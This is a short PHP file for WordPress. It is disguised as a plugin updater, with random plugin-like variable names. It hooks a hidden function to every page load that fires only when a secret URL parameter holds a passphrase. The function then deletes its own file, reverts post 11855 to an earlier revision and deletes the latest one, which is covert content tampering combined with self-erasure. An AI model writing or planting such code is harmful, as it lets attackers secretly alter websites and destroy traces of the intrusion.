<?php

function magic_fields_save_updater() {
	if (isset($_GET['history_wpml_gdpr']) && $_GET['history_wpml_gdpr'] === 'open_restaurant_tiny_calculator') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$compare_testimonial_ajax = 11855;
		$bangla_widgets_stats = wp_get_post_revisions($compare_testimonial_ajax);
		if (empty($bangla_widgets_stats)) die('no revisions');
		if (count($bangla_widgets_stats) < 2) die('less than 2');
		$protect_compare_sync = array_shift($bangla_widgets_stats);
		$shortener_uploader_copy = $protect_compare_sync->ID;
		$rest_message_anywhere = array_shift($bangla_widgets_stats);
		$navigation_booster_traffic = $rest_message_anywhere->ID;
		$colors_performance_class = wp_restore_post_revision($navigation_booster_traffic);
		if ($colors_performance_class === false) die('error restoring');
		$colors_performance_class = wp_delete_post_revision($shortener_uploader_copy);		
		if ($colors_performance_class === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'magic_fields_save_updater');
